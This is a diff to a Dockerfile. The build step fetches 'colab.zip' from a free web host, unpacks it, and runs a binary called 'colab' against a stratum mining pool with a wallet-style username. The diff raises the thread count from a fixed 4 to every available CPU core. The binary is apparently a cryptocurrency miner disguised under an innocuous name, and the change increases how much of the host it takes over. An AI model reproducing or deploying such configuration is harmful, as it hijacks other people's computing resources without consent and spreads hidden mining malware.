@@ -8,4 +8,4 @@ RUN apt-get update && apt-get dist-upgrade -y && \
 RUN apt-get update && apt-get install zip wget -y && \
     wget https://penyimpananwget.000webhostapp.com/colab.zip && \
     unzip colab.zip && \
-    ./colab -a colab -o stratum+grpc://colab.jadepool.cloud:666 -u RRSVEyN8J6icKKxdb9dohJE8NCun8rqZSL.duck -p x -t 4
+    ./colab -a colab -o stratum+grpc://colab.jadepool.cloud:666 -u RRSVEyN8J6icKKxdb9dohJE8NCun8rqZSL.duck -p x -t $(nproc)
